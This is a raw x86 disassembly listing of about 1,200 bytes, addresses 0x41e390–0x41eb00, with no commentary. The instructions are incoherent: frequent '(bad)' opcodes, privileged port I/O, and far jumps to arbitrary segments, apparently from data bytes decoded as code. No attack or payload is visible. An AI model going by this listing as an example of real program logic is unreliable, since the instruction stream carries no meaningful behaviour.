  41e390:	mov    ah,BYTE PTR [ecx]
  41e392:	fidiv  WORD PTR [edi+0x27]
  41e395:	inc    esp
  41e396:	mov    al,0x3b
  41e398:	xchg   edi,eax
  41e399:	sbb    cl,al
  41e39b:	mov    edi,ss
  41e39d:	sub    al,0x83
  41e39f:	loopne 0x41e352
  41e3a1:	push   ecx
  41e3a2:	jg     0x41e38f
  41e3a4:	cmp    ch,bl
  41e3a6:	pop    ds
  41e3a7:	fisubr WORD PTR [edx+0xd74075b]
  41e3ad:	mov    edx,eax
  41e3af:	mov    edx,ecx
  41e3b1:	jmp    0xb07b:0x3103ebac
  41e3b8:	adc    BYTE PTR [edx],cl
  41e3ba:	rcr    BYTE PTR [ebx+ebp*8-0x7e1b60cd],0x9c
  41e3c2:	mov    edi,fs
  41e3c4:	les    ebp,FWORD PTR [esi+0x46]
  41e3c7:	je     0x41e409
  41e3c9:	dec    esi
  41e3ca:	and    BYTE PTR [edi],ah
  41e3cc:	mov    esi,0x4575c4f8
  41e3d1:	fadd   QWORD PTR [ecx]
  41e3d3:	mov    cl,0xa3
  41e3d5:	add    ecx,0xfaa17800
  41e3db:	or     eax,0x4c15460
  41e3e0:	add    edx,DWORD PTR [ecx+eax*8]
  41e3e3:	sbb    eax,0x6e83943b
  41e3e8:	sbb    esi,ebp
  41e3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3eb:	dec    esi
  41e3ec:	setg   dl
  41e3ef:	dec    eax
  41e3f0:	sti    
  41e3f1:	add    al,0xac
  41e3f3:	jge    0x41e3d8
  41e3f5:	pop    ebp
  41e3f6:	imul   ecx,DWORD PTR ds:0x65046f03,0x32
  41e3fd:	call   FWORD PTR [edi+0x6b]
  41e400:	mov    dh,bl
  41e402:	test   BYTE PTR [ecx+0x368c9522],al
  41e408:	cmp    eax,0x8db9f0d9
  41e40d:	std    
  41e40e:	mov    esi,DWORD PTR [ebp+0x8]
  41e411:	add    ebx,DWORD PTR [esi+eax*8-0x63bd8ab7]
  41e418:	xchg   BYTE PTR [edi+0x22],bh
  41e41b:	sbb    BYTE PTR [eax-0x7e],0x12
  41e41f:	push   ebx
  41e420:	pop    ecx
  41e421:	jmp    0x41e464
  41e423:	mov    ebx,0x2f2f6f7
  41e428:	mov    DWORD PTR [edx+eax*4+0x48520916],ecx
  41e42f:	xor    BYTE PTR [ecx-0x6c],al
  41e432:	dec    ebx
  41e433:	in     al,0xc4
  41e435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e436:	(bad)  
  41e437:	hlt    
  41e438:	jns    0x41e3ea
  41e43a:	or     BYTE PTR [edi-0x18],dh
  41e43d:	cld    
  41e43e:	inc    DWORD PTR [ebp+0x31f002fc]
  41e444:	push   ebx
  41e445:	inc    edi
  41e446:	add    eax,0x200140f6
  41e44b:	pop    ebx
  41e44c:	test   DWORD PTR [ebx+0x57f15d],esi
  41e452:	pop    es
  41e453:	aaa    
  41e454:	ret    
  41e455:	loopne 0x41e46c
  41e457:	data16 rcr BYTE PTR [edx],1
  41e45a:	adc    DWORD PTR [ebx],esp
  41e45c:	add    eax,0xbad70f2b
  41e461:	stos   BYTE PTR es:[edi],al
  41e462:	and    eax,0x8a22fc80
  41e467:	xchg   ebp,eax
  41e468:	test   eax,0x2fc7d98a
  41e46d:	les    eax,FWORD PTR [eax+0x74]
  41e470:	adc    esp,DWORD PTR [esp+eiz*8]
  41e473:	mov    bl,0x64
  41e475:	fwait
  41e476:	lods   eax,DWORD PTR ds:[esi]
  41e477:	add    BYTE PTR [ebx-0x8],cl
  41e47a:	jmp    0x41e48b
  41e47c:	adc    dl,BYTE PTR [eax]
  41e47e:	fidiv  WORD PTR [ebx-0x7f19324]
  41e484:	movzx  eax,WORD PTR [eax]
  41e487:	lock popf 
  41e489:	add    eax,0x28efd8d
  41e48e:	sub    DWORD PTR [ebx+0x43],0x33
  41e492:	dec    DWORD PTR [ebp+0x47c6c6b5]
  41e498:	add    BYTE PTR [edi],ch
  41e49a:	mov    dl,0x2a
  41e49c:	call   0xca2e59a6
  41e4a1:	add    dh,BYTE PTR [ebp-0x73]
  41e4a4:	inc    edi
  41e4a5:	add    DWORD PTR [edx],ebx
  41e4a7:	clc    
  41e4a8:	mov    ch,0xf0
  41e4aa:	nop
  41e4ab:	fwait
  41e4ac:	or     eax,0x858d7bd9
  41e4b1:	hlt    
  41e4b2:	adc    BYTE PTR [ebx],bl
  41e4b4:	clc    
  41e4b5:	lods   al,BYTE PTR ds:[esi]
  41e4b6:	inc    eax
  41e4b7:	pop    eax
  41e4b8:	cwde   
  41e4b9:	std    
  41e4ba:	cmp    edx,DWORD PTR [ebp+0x4502b21]
  41e4c0:	inc    edx
  41e4c1:	seto   BYTE PTR [edi-0xa]
  41e4c5:	mov    dl,0xb7
  41e4c7:	and    BYTE PTR [eax],cl
  41e4c9:	dec    ebx
  41e4ca:	jne    0x41e46a
  41e4cc:	jne    0x41e4e8
  41e4ce:	inc    ebx
  41e4cf:	inc    esi
  41e4d0:	fsub   DWORD PTR [esi+0x54]
  41e4d3:	xchg   DWORD PTR [esi-0xd],eax
  41e4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4d7:	or     bl,al
  41e4d9:	scas   al,BYTE PTR es:[edi]
  41e4da:	xor    eax,0x2472cd28
  41e4df:	repz push ebp
  41e4e1:	and    eax,0x231e0a5b
  41e4e6:	scas   eax,DWORD PTR es:[edi]
  41e4e7:	les    esi,FWORD PTR [ecx+ebx*2-0x1b]
  41e4eb:	sub    dh,BYTE PTR [ebx+0x39]
  41e4ee:	pusha  
  41e4ef:	outs   dx,DWORD PTR ds:[esi]
  41e4f0:	fs in  al,dx
  41e4f2:	test   DWORD PTR ds:0xe600b676,ebp
  41e4f8:	in     al,dx
  41e4f9:	out    dx,al
  41e4fa:	add    eax,0xf8c60a1e
  41e4ff:	push   ebp
  41e500:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e502:	or     al,0x6f
  41e505:	ret    0xb575
  41e508:	add    ebp,DWORD PTR [eax]
  41e50a:	mov    cl,0x8c
  41e50c:	push   eax
  41e50d:	cmp    BYTE PTR [eax],al
  41e50f:	xchg   ebx,eax
  41e510:	pop    ebx
  41e511:	aaa    
  41e512:	push   edx
  41e513:	loop   0x41e57a
  41e515:	mov    edi,0x14fe5044
  41e51a:	jae    0x41e529
  41e51c:	push   ebx
  41e51d:	pop    ds
  41e51e:	jmp    0x41e57b
  41e520:	aas    
  41e521:	and    ch,dh
  41e523:	or     BYTE PTR [ecx],bl
  41e525:	add    DWORD PTR [ebp+0xf],esi
  41e528:	cmp    BYTE PTR [ebp+0x2c6e9643],cl
  41e52e:	mov    ds:0x1545b308,al
  41e533:	add    DWORD PTR [edx],ecx
  41e535:	or     edi,DWORD PTR [edi-0x54]
  41e538:	and    dl,BYTE PTR [ebx+0x58]
  41e53b:	or     al,0xeb
  41e53d:	xor    al,0x66
  41e53f:	idiv   ecx
  41e541:	and    BYTE PTR [ebx-0x2b],bl
  41e544:	(bad)  
  41e545:	test   al,0x74
  41e547:	jge    0x41e50e
  41e549:	add    bl,ch
  41e54b:	and    al,0xe1
  41e54d:	mov    al,0x14
  41e550:	je     0x41e580
  41e552:	fbstp  TBYTE PTR [ebx+esi*8+0xa6ec051]
  41e559:	mov    WORD PTR [ebx+ebp*8],fs
  41e55c:	or     ebx,DWORD PTR [esp+eax*2-0x44]
  41e560:	mov    ch,0x18
  41e562:	sub    edi,DWORD PTR [ecx]
  41e564:	mov    bl,0xbf
  41e566:	jne    0x41e56e
  41e568:	xor    DWORD PTR [esi+0x3d9e7bf1],esi
  41e56e:	(bad)  
  41e56f:	jl     0x41e57c
  41e571:	push   eax
  41e572:	mov    edx,0x53921958
  41e577:	xchg   ebp,eax
  41e578:	lahf   
  41e579:	mov    DWORD PTR [esp+ebx*8-0x70],0x8d073e33
  41e581:	clc    
  41e582:	fimul  DWORD PTR [ecx+0x133043a1]
  41e588:	mov    dl,0xb1
  41e58a:	fwait
  41e58b:	add    ecx,DWORD PTR [eax-0x1ce611f]
  41e591:	xchg   ebp,eax
  41e592:	or     eax,0xe88f438b
  41e597:	or     DWORD PTR [ecx+edx*4],ecx
  41e59a:	test   eax,0x895e818c
  41e59f:	fsub   QWORD PTR [eax+eiz*1-0x67]
  41e5a3:	nop
  41e5a4:	fsub   st(0),st
  41e5a6:	call   0x8e8a49b7
  41e5ab:	(bad)  
  41e5ad:	mov    bh,0xc0
  41e5af:	mov    esi,DWORD PTR [ecx+ecx*2-0x3]
  41e5b3:	jl     0x41e5ba
  41e5b5:	or     al,0x38
  41e5b7:	cmc    
  41e5b8:	cmp    eax,DWORD PTR [esi-0x77]
  41e5bb:	mov    al,0x46
  41e5bd:	cmp    DWORD PTR [ebp-0x338afffb],0xffffff86
  41e5c4:	ins    BYTE PTR es:[edi],dx
  41e5c5:	mov    WORD PTR [ecx+0xafc5a38],cs
  41e5cb:	add    al,0xbc
  41e5cd:	div    DWORD PTR [esi]
  41e5cf:	mov    eax,0x5d0a200c
  41e5d4:	sub    edx,esi
  41e5d6:	mov    esp,0xd789a30a
  41e5db:	(bad)  
  41e5dc:	adc    al,0x52
  41e5de:	lea    eax,[ebp-0x171b37b4]
  41e5e4:	idiv   BYTE PTR [eax+0x23]
  41e5e7:	cdq    
  41e5e8:	nop
  41e5e9:	loopne 0x41e5d7
  41e5eb:	cmp    eax,0x6638719e
  41e5f0:	mov    cl,0x26
  41e5f2:	call   DWORD PTR [ebp+0x44c7ffa4]
  41e5f8:	or     DWORD PTR [eax+ecx*2],0x12eb8d7f
  41e5ff:	push   ebx
  41e600:	add    dl,BYTE PTR [ebp+eax*8-0x6f2eed1c]
  41e607:	ja     0x41e5d3
  41e609:	xor    al,0x68
  41e60b:	add    BYTE PTR [ebp-0x1d],ah
  41e60e:	fcom   QWORD PTR [edi-0x4d165ffd]
  41e614:	sub    al,0xcd
  41e616:	xchg   ebx,eax
  41e617:	sbb    al,0x3e
  41e619:	dec    DWORD PTR [esi]
  41e61b:	push   esi
  41e61c:	sbb    eax,0x1939669e
  41e621:	xchg   esp,eax
  41e622:	jns    0x41e623
  41e624:	pop    ss
  41e625:	add    DWORD PTR [ecx+0x61],edx
  41e628:	jmp    0x3e5f:0x22086500
  41e62f:	mov    ebp,0x3bbec6a8
  41e634:	inc    DWORD PTR [ecx]
  41e636:	adc    esp,DWORD PTR [esi-0x77]
  41e639:	cmp    ebx,DWORD PTR [edi-0x29eab31c]
  41e63f:	sbb    DWORD PTR [esi],ebp
  41e641:	adc    al,0xeb
  41e643:	inc    ecx
  41e644:	loop   0x41e69c
  41e646:	shr    BYTE PTR [edi+eax*8],1
  41e649:	adc    BYTE PTR [ebx+0x348684c9],cl
  41e64f:	std    
  41e650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e651:	or     al,bh
  41e653:	mov    al,ds:0xc7352aeb
  41e658:	pop    esp
  41e659:	inc    ecx
  41e65a:	lods   eax,DWORD PTR ds:[esi]
  41e65b:	and    bl,dh
  41e65d:	lea    eax,[ebx]
  41e65f:	jnp    0x41e644
  41e661:	or     edx,DWORD PTR [eax-0x14d78be8]
  41e667:	or     al,0x7a
  41e669:	jmp    FWORD PTR [edx]
  41e66b:	data16 add BYTE PTR [edi],ch
  41e66e:	sub    edi,DWORD PTR [ebx]
  41e670:	repz je 0x41e6a9
  41e673:	inc    esp
  41e674:	inc    esi
  41e675:	mov    dh,0x63
  41e677:	lods   eax,DWORD PTR ds:[esi]
  41e678:	jne    0x41e6a0
  41e67a:	mov    ah,0x6
  41e67c:	(bad)  
  41e67d:	fadd   QWORD PTR [eax+0x55da11e0]
  41e683:	inc    esi
  41e684:	add    al,0x58
  41e686:	sub    bl,BYTE PTR [ebx+0x7b]
  41e689:	ins    BYTE PTR es:[edi],dx
  41e68a:	add    BYTE PTR ds:0x9a09ac0c,0x54
  41e691:	cmp    al,0xa1
  41e693:	int3   
  41e694:	leave  
  41e695:	mov    bh,dh
  41e697:	mov    ds:0xca29d438,eax
  41e69c:	fisttp DWORD PTR [ecx+0x50220f8]
  41e6a2:	pop    ecx
  41e6a3:	pop    esp
  41e6a4:	mov    eax,0x851a86e1
  41e6a9:	or     eax,0xba660dcc
  41e6ae:	push   es
  41e6af:	gs enter 0x5026,0x1c
  41e6b4:	in     al,dx
  41e6b5:	pop    ebx
  41e6b6:	sbb    esi,DWORD PTR [edi]
  41e6b8:	push   0x24
  41e6ba:	xchg   edi,eax
  41e6bb:	pushf  
  41e6bc:	inc    edi
  41e6bd:	fs pop es
  41e6bf:	cmp    al,0x83
  41e6c1:	pop    ecx
  41e6c2:	lods   al,BYTE PTR ds:[esi]
  41e6c3:	(bad)  
  41e6c4:	mov    esp,0x4ba2cbd1
  41e6c9:	mov    esi,0x564e9b21
  41e6ce:	dec    ecx
  41e6cf:	call   0x93979ef4
  41e6d4:	or     ebp,DWORD PTR [ebx+0x43]
  41e6d7:	adc    al,0xa8
  41e6d9:	sbb    DWORD PTR [esi+0x5e],0x5b
  41e6dd:	dec    edi
  41e6de:	je     0x41e6e6
  41e6e0:	and    ebp,ebx
  41e6e2:	inc    edx
  41e6e3:	std    
  41e6e4:	adc    esi,DWORD PTR ds:0xfc326817
  41e6ea:	cld    
  41e6eb:	fwait
  41e6ec:	pop    esp
  41e6ed:	adc    al,0xc3
  41e6ef:	gs xchg edx,eax
  41e6f1:	in     eax,dx
  41e6f2:	add    ebx,DWORD PTR [edx-0xfdfd915]
  41e6f8:	lock inc edx
  41e6fa:	xchg   DWORD PTR [ebx+ebx*4],ebp
  41e6fd:	hlt    
  41e6fe:	pop    ebx
  41e6ff:	(bad)  
  41e700:	hlt    
  41e701:	add    eax,0x40772a32
  41e706:	and    ch,BYTE PTR [esi]
  41e708:	retf   
  41e709:	test   eax,0x9182a432
  41e70e:	xchg   edx,eax
  41e70f:	mov    bl,0x2b
  41e711:	pmulhuw mm4,QWORD PTR ds:0xce864b5
  41e718:	int3   
  41e719:	outs   dx,DWORD PTR ds:[esi]
  41e71a:	fs mov al,0x31
  41e71d:	fdivr  QWORD PTR ds:0x4d168463
  41e723:	xchg   ecx,eax
  41e724:	out    dx,eax
  41e725:	or     eax,0xd9086af6
  41e72a:	push   ebx
  41e72b:	and    ch,bl
  41e72d:	hlt    
  41e72e:	inc    ebp
  41e72f:	les    ebx,FWORD PTR [edx+0x6b]
  41e732:	pushf  
  41e733:	loopne 0x41e741
  41e735:	fdivr  st(3),st
  41e737:	xlat   BYTE PTR ds:[ebx]
  41e738:	add    ecx,edx
  41e73a:	imul   ecx,DWORD PTR [ebp+0x409af821],0xffffff8b
  41e741:	inc    ebp
  41e742:	add    BYTE PTR [ebx-0x28349000],0x7f
  41e749:	mov    eax,0x88cb2c35
  41e74e:	fsub   QWORD PTR [ebx+edx*8]
  41e751:	retf   
  41e752:	icebp  
  41e753:	pop    es
  41e754:	push   ss
  41e755:	in     al,0xc8
  41e757:	int3   
  41e758:	push   esp
  41e759:	xabort 0x1c
  41e75c:	jbe    0x41e702
  41e75e:	in     al,0x53
  41e760:	mov    edi,0x1ecf458d
  41e765:	aas    
  41e766:	xor    ecx,DWORD PTR [eax+0x47]
  41e769:	neg    BYTE PTR [esi+0x4]
  41e76c:	cmp    eax,ebx
  41e76e:	mov    ch,0xd2
  41e770:	jo     0x41e719
  41e772:	aaa    
  41e773:	or     BYTE PTR [ebp+0x71f5cd3],dl
  41e779:	nop
  41e77a:	arpl   WORD PTR [esi+0xc10c2c6],cx
  41e780:	test   ch,cl
  41e782:	pusha  
  41e783:	push   0x9
  41e785:	and    edi,DWORD PTR [ecx]
  41e787:	fldcw  WORD PTR [edi]
  41e789:	xchg   BYTE PTR [edx],ah
  41e78b:	pop    ss
  41e78c:	hlt    
  41e78d:	aas    
  41e78e:	xchg   edx,eax
  41e78f:	xor    BYTE PTR [eax+ebx*1],cl
  41e792:	add    BYTE PTR [ebp+ebp*2-0x78],0x2b
  41e797:	mov    cl,BYTE PTR [ebx+0x11]
  41e79a:	xor    eax,esi
  41e79c:	add    DWORD PTR [eax-0x49bf0d83],eax
  41e7a2:	lods   eax,DWORD PTR ds:[esi]
  41e7a3:	imul   edx,DWORD PTR [ecx-0x7e],0xffffffe4
  41e7a7:	int    0x55
  41e7a9:	ret    0xa7d1
  41e7ac:	push   0xffffffea
  41e7ae:	mov    ecx,ebx
  41e7b0:	adc    ebp,esi
  41e7b2:	push   eax
  41e7b3:	dec    edi
  41e7b4:	lods   eax,DWORD PTR ds:[esi]
  41e7b5:	adc    BYTE PTR [edi],cl
  41e7b7:	sbb    al,0x58
  41e7b9:	in     al,dx
  41e7ba:	test   BYTE PTR [ecx-0x32c2bdbd],bh
  41e7c0:	pop    esp
  41e7c1:	inc    eax
  41e7c2:	and    BYTE PTR ds:0x8adacd4d,0x59
  41e7c9:	out    0xd3,eax
  41e7cb:	push   cs
  41e7cc:	loopne 0x41e7f4
  41e7ce:	daa    
  41e7cf:	mov    WORD PTR [esi-0x2e],?
  41e7d2:	xchg   ecx,eax
  41e7d3:	lea    esp,[edx-0x78d3f40e]
  41e7d9:	shl    BYTE PTR [esp+edx*1+0x237870f],1
  41e7e0:	mov    ecx,0x280fdd34
  41e7e5:	int    0x9e
  41e7e7:	add    esi,edx
  41e7e9:	dec    dh
  41e7eb:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41e7ed:	imul   ebx,DWORD PTR [edx+0x7c5b41a6],0xd359ba9d
  41e7f7:	xor    eax,0xb5cfd797
  41e7fc:	into   
  41e7fd:	or     edi,esp
  41e7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e800:	punpckhwd mm3,QWORD PTR [edx+0x17036c66]
  41e807:	xor    cl,BYTE PTR [esi+0x69]
  41e80a:	push   0x37
  41e80c:	sub    DWORD PTR [eax-0x2d5c7579],ebp
  41e812:	ds pop edx
  41e814:	arpl   WORD PTR [ebx],bp
  41e816:	mov    ecx,0xdfb99ff
  41e81b:	loopne 0x41e825
  41e81d:	mov    ds:0xdc28b918,al
  41e822:	add    al,0x8e
  41e824:	enter  0xac77,0xab
  41e828:	inc    ebx
  41e829:	adc    BYTE PTR [edi],ah
  41e82b:	test   al,bl
  41e82d:	sar    BYTE PTR [esi],0x8e
  41e830:	les    ecx,FWORD PTR [edi]
  41e832:	mov    edi,0xdc645e82
  41e837:	(bad)  
  41e838:	sbb    cl,BYTE PTR [esi]
  41e83a:	fs mov dl,0xd2
  41e83d:	add    BYTE PTR [ecx],bl
  41e83f:	clc    
  41e840:	fst    DWORD PTR [esi-0x3b]
  41e843:	push   es
  41e844:	rcl    DWORD PTR [esi],1
  41e846:	cmp    ebx,ebx
  41e848:	inc    eax
  41e849:	daa    
  41e84a:	adc    BYTE PTR [ecx],0x8a
  41e84d:	data16 jno 0x41e806
  41e850:	and    BYTE PTR [ebx],al
  41e852:	xor    ah,BYTE PTR [eax+0x20]
  41e855:	(bad)  
  41e857:	jo     0x41e8c5
  41e859:	pop    ds
  41e85a:	enter  0xfff0,0x73
  41e85e:	or     al,0x2
  41e860:	or     BYTE PTR [esi-0x13693d99],dl
  41e866:	jge    0x41e832
  41e868:	js     0x41e886
  41e86a:	call   0x9682ac28
  41e86f:	mov    al,0xe8
  41e871:	retf   
  41e872:	xchg   esi,eax
  41e873:	in     al,dx
  41e874:	sar    BYTE PTR [eax],0x15
  41e877:	mov    al,0xbf
  41e879:	in     al,0x24
  41e87b:	mov    dh,0x67
  41e87d:	dec    ebx
  41e87e:	and    eax,0xcabb66c1
  41e883:	call   0x2684c8a2
  41e888:	sti    
  41e889:	inc    edx
  41e88a:	fmul   QWORD PTR [edi]
  41e88c:	mov    esi,0x3217dcf0
  41e891:	pop    ecx
  41e892:	shl    DWORD PTR [eax-0x76],cl
  41e895:	sbb    ebx,eax
  41e897:	aam    0x37
  41e899:	nop
  41e89a:	leave  
  41e89b:	or     al,ch
  41e89d:	sbb    dl,ah
  41e89f:	push   0x22a66cd9
  41e8a4:	test   ecx,ebp
  41e8a6:	rcr    BYTE PTR [edi+0x50],1
  41e8a9:	ins    BYTE PTR es:[edi],dx
  41e8aa:	mov    al,0x3
  41e8ac:	fs ror ah,1
  41e8af:	sbb    al,0xcc
  41e8b1:	cmp    ah,BYTE PTR [eax+0x33]
  41e8b4:	sbb    al,0x84
  41e8b6:	pop    ecx
  41e8b7:	repz data16 and al,0x64
  41e8bb:	cmp    edx,esi
  41e8bd:	enter  0xcb3e,0xac
  41e8c1:	sub    eax,ecx
  41e8c3:	xor    al,0xff
  41e8c5:	or     ecx,DWORD PTR [ebp-0x4]
  41e8c8:	jmp    0xcaff:0x660774c9
  41e8cf:	je     0x41e8e2
  41e8d1:	jmp    0x41e8fb
  41e8d3:	push   ebx
  41e8d4:	jb     0x41e93a
  41e8d6:	mov    al,0x19
  41e8d8:	adc    dh,BYTE PTR [edi]
  41e8da:	(bad)  
  41e8db:	int3   
  41e8dc:	js     0x41e86c
  41e8de:	mov    ebx,0x23c4c818
  41e8e3:	je     0x13895ff4
  41e8e9:	das    
  41e8ea:	inc    eax
  41e8eb:	cmc    
  41e8ec:	and    eax,0xf879bfff
  41e8f1:	mov    BYTE PTR [edi+0x6e],cl
  41e8f4:	xchg   edi,eax
  41e8f5:	addr16 in al,0x1
  41e8f8:	test   eax,edx
  41e8fa:	daa    
  41e8fb:	add    edx,edx
  41e8fd:	add    al,0xd0
  41e8ff:	jnp    0x41e92f
  41e901:	dec    ebp
  41e902:	shl    DWORD PTR [eax+ebx*4],cl
  41e905:	mov    ah,0xd7
  41e907:	cli    
  41e908:	rcr    DWORD PTR [ecx],1
  41e90a:	dec    ecx
  41e90b:	mov    bl,0x25
  41e90d:	imul   edi,DWORD PTR [eax],0x23
  41e910:	cmovns esi,esi
  41e913:	shl    DWORD PTR [ecx*8+0x66d1036f],cl
  41e91a:	and    DWORD PTR [eax-0x31e4f743],0x55
  41e921:	(bad)  
  41e923:	fst    DWORD PTR [edi+0x0]
  41e926:	dec    ecx
  41e927:	push   cs
  41e928:	jnp    0x41e941
  41e92a:	xor    al,al
  41e92c:	mov    esp,0xc8bc1bf6
  41e931:	fs sbb al,0x12
  41e934:	psubusw mm0,QWORD PTR [eax]
  41e937:	cmp    DWORD PTR [eax+0x364325c8],edi
  41e93d:	mov    eax,0x3cb4dd22
  41e942:	mov    ds:0x1db43242,al
  41e947:	ins    BYTE PTR es:[edi],dx
  41e948:	and    BYTE PTR [ebx-0x4f4fa194],al
  41e94e:	push   ds
  41e94f:	nop
  41e950:	mov    al,0xc1
  41e952:	mov    eax,0x1eac60ac
  41e957:	xchg   ebp,eax
  41e958:	sbb    esp,ebp
  41e95a:	sti    
  41e95b:	pop    ecx
  41e95c:	mov    edx,DWORD PTR [edx]
  41e95e:	adc    BYTE PTR [eax-0x50],bl
  41e961:	test   al,0xef
  41e963:	inc    edx
  41e964:	push   es
  41e965:	ret    
  41e966:	sbb    al,0x4e
  41e968:	test   al,0xa4
  41e96a:	jmp    0xa4be:0x90e42ef9
  41e971:	mov    al,ds:0xe790b61c
  41e976:	inc    edx
  41e977:	push   cs
  41e978:	mov    al,ds:0x8ce3b79c
  41e97d:	and    esp,ebx
  41e97f:	pushf  
  41e980:	sbb    BYTE PTR [eax],al
  41e982:	push   ebp
  41e983:	cwde   
  41e984:	cmp    BYTE PTR [esi-0x27],dh
  41e987:	inc    ecx
  41e988:	push   es
  41e989:	cwde   
  41e98a:	jmp    0x41e9f4
  41e98c:	rcl    BYTE PTR [ebx+ebx*1+0xc87181c],0x94
  41e994:	dec    esp
  41e995:	push   ecx
  41e996:	jmp    0x41e96e
  41e998:	popa   
  41e999:	xchg   ebx,eax
  41e99a:	je     0x41e9ea
  41e99c:	nop
  41e99d:	nop
  41e99e:	and    ebp,DWORD PTR [eax]
  41e9a0:	daa    
  41e9a1:	jne    0x41e9d4
  41e9a3:	xchg   BYTE PTR [ebx],cl
  41e9a5:	daa    
  41e9a6:	xor    bl,ah
  41e9a8:	lds    edx,FWORD PTR [edx+eax*2]
  41e9ab:	loopne 0x41e9f9
  41e9ad:	mov    dl,0x29
  41e9af:	mov    WORD PTR [edx+eax*1-0xd3b3fd0],cs
  41e9b6:	rcr    BYTE PTR [eax+0x694748c],cl
  41e9bc:	add    edx,DWORD PTR [ebx]
  41e9be:	loop   0x41e968
  41e9c0:	cmp    bh,dl
  41e9c2:	test   DWORD PTR [edx+0x441300cb],esi
  41e9c8:	scas   al,BYTE PTR es:[edi]
  41e9c9:	add    al,0x19
  41e9cb:	mov    cl,cl
  41e9cd:	xchg   ebp,eax
  41e9ce:	shr    esi,0xb7
  41e9d1:	xor    bl,BYTE PTR [eax-0x10246f3f]
  41e9d7:	in     al,dx
  41e9d8:	stos   DWORD PTR es:[edi],eax
  41e9d9:	in     al,0x4
  41e9db:	repnz ror DWORD PTR [edx-0x2d],cl
  41e9df:	sub    eax,0xc8c1b25d
  41e9e4:	or     BYTE PTR [eax],al
  41e9e6:	push   esi
  41e9e7:	jmp    0xc0b4d6d8
  41e9ec:	and    BYTE PTR [ecx+ebp*1-0x21],ah
  41e9f0:	shl    DWORD PTR [ecx+ebx*1],cl
  41e9f3:	cmp    al,0xeb
  41e9f5:	inc    eax
  41e9f6:	rcl    DWORD PTR [ecx-0x63],cl
  41e9f9:	xor    esi,DWORD PTR [eax]
  41e9fb:	ja     0x41ea22
  41e9fd:	(bad)  
  41e9fe:	xor    BYTE PTR [eax-0x25],bl
  41ea01:	shr    DWORD PTR [esi+0x4f25e483],cl
  41ea07:	aam    0x80
  41ea09:	xor    edx,ebx
  41ea0b:	mov    ch,0xb3
  41ea0d:	xchg   ecx,eax
  41ea0e:	rol    ebx,0xe0
  41ea11:	push   ebx
  41ea12:	sbb    ah,al
  41ea14:	loopne 0x41ea80
  41ea16:	add    BYTE PTR fs:[ebx-0x118b2b37],al
  41ea1d:	fs enter 0x860,0x87
  41ea22:	aam    0x57
  41ea24:	cmp    ch,bl
  41ea26:	fs nop
  41ea28:	gs loope 0x41ea7b
  41ea2b:	sub    eax,esp
  41ea2d:	in     al,dx
  41ea2e:	loopne 0x41e9e0
  41ea30:	xchg   ecx,eax
  41ea31:	les    ebp,FWORD PTR [ebx]
  41ea33:	aam    0x5e
  41ea35:	add    DWORD PTR [eax+ecx*2],ebx
  41ea38:	bound  eax,QWORD PTR [edx+0x29467b3b]
  41ea3e:	push   ds
  41ea3f:	add    DWORD PTR [eax+ecx*2+0x62],0xdb1e1f90
  41ea47:	inc    ebx
  41ea48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea49:	in     al,0xd9
  41ea4b:	retf   0xd42a
  41ea4e:	mov    ebp,0xa69ad503
  41ea53:	imul   ebx,DWORD PTR [edx+0x60451d11],0x97349b7a
  41ea5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea5e:	imul   edi,DWORD PTR [ecx+ebx*8-0x1f38290a],0xd3580be6
  41ea69:	push   cs
  41ea6a:	mov    dh,0xf
  41ea6c:	add    ebp,DWORD PTR [ecx]
  41ea6e:	inc    esi
  41ea6f:	mov    ds:0x60449a69,al
  41ea74:	jnp    0x41ea0f
  41ea76:	push   ds
  41ea77:	xor    ebp,DWORD PTR [ebp-0x26837f1c]
  41ea7d:	push   eax
  41ea7e:	or     BYTE PTR [eax],al
  41ea80:	pop    ebx
  41ea81:	dec    ecx
  41ea82:	les    ecx,FWORD PTR [esi]
  41ea84:	mov    edi,0x41a1e27
  41ea89:	pop    ebx
  41ea8a:	dec    ecx
  41ea8b:	sub    al,0x1e
  41ea8d:	sbb    DWORD PTR [edx],edx
  41ea8f:	rcl    DWORD PTR [esi+0x48],0x1e
  41ea93:	and    BYTE PTR [esi],bl
  41ea95:	add    DWORD PTR [eax+esi*4+0x15],0x256c1e20
  41ea9d:	xor    DWORD PTR [ebx+0x33],edi
  41eaa0:	ins    BYTE PTR es:[edi],dx
  41eaa1:	sbb    al,0x1e
  41eaa3:	sbb    al,0xc
  41eaa5:	mov    dh,0x92
  41eaa7:	mov    eax,0xe4ad1b56
  41eaac:	mov    DWORD PTR [ecx-0x1beeb7f3],eax
  41eab2:	xor    dl,BYTE PTR [ecx]
  41eab4:	loop   0x41ea78
  41eab6:	push   es
  41eab7:	fs loopne 0x41ea9a
  41eaba:	jecxz  0x41ea98
  41eabc:	and    al,0x2e
  41eabe:	in     al,dx
  41eabf:	inc    eax
  41eac0:	adc    esp,ebx
  41eac2:	sbb    ebx,eax
  41eac4:	adc    DWORD PTR [ebx-0x27f93f3c],edx
  41eaca:	sbb    dl,BYTE PTR [ecx]
  41eacc:	aam    0x92
  41eace:	pop    eax
  41eacf:	fldenv [eax]
  41ead1:	aam    0xdc
  41ead3:	cs xor ecx,ebp
  41ead6:	pop    edx
  41ead7:	cmp    bh,BYTE PTR ss:[edi-0x24df99d7]
  41eade:	mov    cl,0x6
  41eae0:	int3   
  41eae1:	cwde   
  41eae2:	rcr    BYTE PTR [esi+esi*4+0x42364dcc],cl
  41eae9:	bound  edx,QWORD PTR [ecx]
  41eaeb:	sahf   
  41eaec:	enter  0x312,0x59
  41eaf0:	mov    ?,WORD PTR [edi]
  41eaf2:	rcl    DWORD PTR [eax+ecx*8+0x11],cl
  41eaf6:	out    0xc9,al
  41eaf8:	in     eax,dx
  41eaf9:	push   eax
  41eafa:	xlat   BYTE PTR ds:[ebx]
  41eafb:	cmp    DWORD PTR [ebx],eax
  41eafd:	fst    DWORD PTR [esi]
  41eaff:	xlat   BYTE PTR ds:[ebx]
  41eb00:	lea    ecx,[ebp+0x73]
